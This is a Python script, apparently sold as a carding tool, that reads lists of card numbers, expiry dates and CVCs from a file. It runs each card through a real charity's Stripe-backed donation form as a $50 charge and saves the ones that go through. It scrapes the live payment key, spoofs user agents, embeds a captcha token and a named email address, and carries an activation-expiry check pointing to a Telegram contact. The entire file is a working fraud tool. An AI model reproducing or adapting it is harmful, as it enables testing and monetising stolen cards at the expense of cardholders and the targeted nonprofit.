import requests,time,re
from user_agent import generate_user_agent
import time
import datetime
import os
import sys
now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = mm + '/' + dd + '/' + yyyy + ' ' + hour + ':' + mi + ':' + ss
hours = now.hour
x = datetime.datetime.now()
g = datetime.datetime(2024, 7, 17, 7, 10, 9)
if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+'خلص التفعيل راسلني افعلك @z3_2q')
 print('\n\n')
 
 sys.exit(0)
 

if (x.strftime("%x"))==(g.strftime("%x")):
   print('')
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'خلص التفعيل راسلني افعلك @z3_2q')
    print('\n\n')
    
    sys.exit(0)
   else:
    print('')  
else:
    print('')
print('')
os.system('clear')
file=open('e.txt',"+r")
nm = 0
for P in file.readlines():
	nm += 1
	num = f'{nm:04}'
	n = P.split('|')[0]
	mm = (P.split('|')[1])
	if "0" not in mm and int(mm) <=9:
		mm = f"0{mm}"
	yy = P.split('|')[2]
	if "20" in yy:
		yy = yy[2:]
	cvc = P.split('|')[3].replace('\n', '')
	P = P.replace('\n', '')
	user=generate_user_agent()
	time.sleep(6)
	headers = {
    'authority': 'www.havefoundation.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://www.havefoundation.org/donate-have/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,}

	params = {
    'form-id': '76',
    'payment-mode': 'stripe_checkout',
    'level-id': '0',
}

	response = requests.get('https://www.havefoundation.org/donate-have/', params=params, headers=headers)
	pk = re.findall('"publishable_key":"(.*?)"',response.text)[0]
	headers = {
    'authority': 'www.havefoundation.org',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.havefoundation.org',
    'referer': 'https://www.havefoundation.org/donate-have/?form-id=76&payment-mode=stripe_checkout&level-id=0',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'action': 'give_donation_form_reset_all_nonce',
    'give_form_id': '76',
}

	response = requests.post('https://www.havefoundation.org/wp-admin/admin-ajax.php', headers=headers, data=data)
	hash=response.json()["data"]["give_form_hash"]
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': user,
}

	data = f'type=card&billing_details[name]=dakar+mohamed&billing_details[email]=mhmdysybasaljbwry%40gmail.com&billing_details[address][line1]=New+York+&billing_details[address][line2]=&billing_details[address][city]=New+York+&billing_details[address][state]=GA&billing_details[address][postal_code]=10080&billing_details[address][country]=US&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=09011653-2533-4020-9705-145c4e832900ca9af5&muid=cd1ae4f3-7a41-448a-a8ad-a2b8e3d1b039227387&sid=8bffd022-c45f-48b2-bff5-453e42f322e916069c&payment_user_agent=stripe.js%2Fdb3292dc43%3B+stripe-js-v3%2Fdb3292dc43%3B+card-element&referrer=https%3A%2F%2Fwww.havefoundation.org&time_on_page=218759&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1FWnjBG2JZUb0LB4&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZ7tsf9LIy3pCGEqo84rH9l4O9pWmIl7Z60LWdoCs3EbF-r6BqdAwbsGwtsVkHvRNU_9O3lvxnbuPX6Pm-j9WlIj43WIrBtwEZAagA2OARP4riLzxVCZtkAE3evoYYP002SirvLX7PqWEiTRehEFgT1mjhHB_LKZnB1wIGN4YbjY2fI8exJ1rXcIS8k_OjPRFmP94Txc75ev-xHKyZwqALKzVAWzcilDlV7UU1nm7v7e9ynVU1rcyH1IjLEDAMdNRSkX_3G0GkENSZ8DfQ40d7jnJobq_o4Rbds7SM1rrjha71cN8mkr2iz4c6IHw3fVnnsnvjdQTFl9w8jU9CO08ysx276ADnSY2Hp9inXKKs8o2pLhzU9lDXrPT-VjaW9XZMk8GYVBsm1QIJ4pDOLtOcBvjOlmHpHXKBMeXTX5ePSWL4S_QKyBEqh7a926LtavoIydx6d1GaA3RzVJl_LCJ_HJ528cb3-_0AOcBcUY9VN6GlCI619Uv90KIYOkPTaVBYzzEnhgfT50UWedurOqNe1ARg2P1jnWXmCd6mFmvVPrSUsgyWF7qCgzaMSOx2HQRE0VGSrq4RTv-KFPkWx6NRX7UE-lDem6TC3p25yp5kTPX1PWNb2Mi_FwDhDaO3FQaxOSjqPmwZocs3vxQfwbwYUWJPoVVlD9z6P1k5frdIyhqcG-qskfuCiL3IGEDD8mj3OP0PmXI4FPuA4U7PmpRQYrHrR1w-Yfy2eahUPmowrY8LIkY1bL0MZp5zqcFyUVDSPKXMGPbCt0g-9BwXtW2GnQUEvsEg7OOxYVk6__6skwPevGAflC6yLpltmxfJDlV_KV-fohHcEneaDHYbgXFZDWQ6AIMYevUirqXK5zr3ut9FG6gMMr9HabYFU7AKAKwUz_2KUmGxmRZE-7rYCG_vfl526_HeHz5LZWZVwQaY6UOggSlOMckT-sSDZ2IjLGiuJMgfeKb-zQ7hbBkHq4K2FDwwnpKUFWfdUAjQBQPETbpEJ9R118d6aN5QAiQN6mvugyksz6vL8RBZyxjSQ1PCgv71T5q7SO_q-Mpy6oL857NMFajWw7BQJxYqPyW5fZHXksDu_uh4ahWzvsO92k34v7u3D4-OKKYII4slKyPrA-FPvxtHSjnBo8tMgkieBffaIbVBz1G87CYEB5P9uNLzy_mxp6ZLEPDyRFLrtAFltSfw_iRXC9QUzC0MvQZVb7m3bCpJ4L9xbAas2feuIpWqfL4Rhua7Aia5m8WOkaHr-BwCaNKKTK2x5jvoTheVp10eV6f2e15w5S0Q3qIJHq60hFpydieUzrSS-sL1oVqm5AwO-5JnZJ_VXxqNQMX2KPgHkHM7l7OBnHtWi2sB7C4Q1rfTB0WOnbMJgMrmFGV5bptHlpEoGCHaYsCwuREa4KZZnufUf8Jckxtk4yNqMntD8-4c3gCtf_Eb7PhaAYHkNxfBNO8JSWNM08k6AjqXXRgWmBjoe8BJAAf4FB7naIs41f_Za1CcyxN-6lht15lbeVIG_ETqaeHAUeY0Q7t3ibKY_C6-mFIpZBMn99bvf2blG3-IZz9bVC8PmSZxq02VlIsdCl843f96DENSjXbFRBANEaJiMraf5cSDRPHjh_JPTtUH_IBybO801tm4oo3K4viArrwpil6VFGJqsbn4ojuu2ei8hEJISle5-d_bE_GSlA68Z293Dg3y1Vb0SkJZCvIVhfKphNVLFsCpGKx2OEUqYwOY9O-R8Pl3TTg-Xr2h4JsHP1WHWFWvyHyAEYfEMVdlE6fk5aCMAaWB6wxzWGpOIKGW7yp7F_5Is3TKnK18ZmnhLQoOg0sj6r4H4eqoFMLwRatInWg2c4TdxMzx6bO92JnP44G377KNGT_-JkA_-VrW4eUCBPcaj4DybpAyTUu5DEyLK_X3ftjcyF4c3T90WRPv_b0FA1KvHQI03hooVRl8cvhY14t2AAP7JS61rQrUkUpiVu0uvDoMZLUAZdJ_CjECj2EGZmjIoDo9FSePuseH4HlxjFkcLEK1HqQie23s4_MjRMSA6yXCpR_C3Po685VLV4RDYdreZnroesn9aGc3uTeRwuJdvwz2G018Gbm7r7oE6dKOW8Gb_2ERTZPFWjDdZ2nB1xgYGP39CTKr8QtQRVEdS8CxG0vp8h4sugBQphdNljxSVa_Gw4W-c6KzjoDIXtjnEZX-z2VsT_rkgLm3NCKQZRBC14GBQo2V4cM5mlRjpqHNoYXJkX2lkzgMxg2-ia3KoMWM0NWUzNDCicGQA.f3QpO-T_ck2LZdfOPE08hV0Jci58MM0u9-hpHp_WkGA'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		pm = response.json()["id"]
	except:
		print(f"[ {num} ]",f"{n}|{mm}|{yy}|{cvc}",":",'Declined ❌')
	pass
	try:
		headers = {
    'authority': 'www.havefoundation.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.havefoundation.org',
    'referer': 'https://www.havefoundation.org/donate-have/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,}

		params = {
    'payment-mode': 'stripe_checkout',
    'form-id': '76',}

		data = {
    'give-fee-amount': '1.8',
    'give-fee-mode-enable': 'false',
    'give-fee-status': 'enabled',
    'give-honeypot': '',
    'give-form-id-prefix': '76-1',
    'give-form-id': '76',
    'give-form-title': 'Donate to HAVE Foundation',
    'give-current-url': 'https://www.havefoundation.org/donate-have/',
    'give-form-url': 'https://www.havefoundation.org/donate-have/',
    'give-form-hash': hash,
    'give-price-id': '0',
    'give-amount': '50.00',
    'give-radio-donation-level': '50.00',
    'give_stripe_payment_method': pm,
    'mailing_address': 'New York ',
    'address_2': '',
    'city': 'New York ',
    'state': 'WY',
    'zip_code': '10080',
    'donation_note': '',
    'give-fee-recovery-settings': '{"fee_data":{"all_gateways":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}',
    'payment-mode': 'stripe_checkout',
    'give_first': 'dakar',
    'give_last': 'mohamed',
    'give_company_option': 'no',
    'give_company_name': '',
    'give_email': 'mhmdysybasaljbwry@gmail.com',
    'billing_country': 'US',
    'card_address': 'New York ',
    'card_address_2': '',
    'card_city': 'New York ',
    'card_state': 'GA',
    'card_zip': '10080',
    'give_validate_stripe_payment_fields': '1',
    'give_action': 'purchase',
    'give-gateway': 'stripe_checkout',}

		response = requests.post('https://www.havefoundation.org/donate-have/', params=params, headers=headers, data=data)
		try:
			msg=re.findall('<p><strong>Error</strong>: (.*?)</p>',response.text)[0]
			clean_msg = msg.replace(" Please check your payment method or contact your card issuer for assistance. If the issue persists, try a different payment method or contact the site administrators.","")
			if "There was an issue with your donation transaction." in clean_msg:
				print(f"[ {num} ]",f"{n}|{mm}|{yy}|{cvc}",":",'Declined ❌')
			else :
				print(f"[ {num} ]",f"{n}|{mm}|{yy}|{cvc}",":",'Charge 50$ ✅ ')
		except:
			print(f"[ {num} ]",f"{n}|{mm}|{yy}|{cvc}",":","Charge 50 $ ✅ ")
			with open('charge 1.txt',"a") as f:
				f.write(f"{P}\n")
	except:
		pass
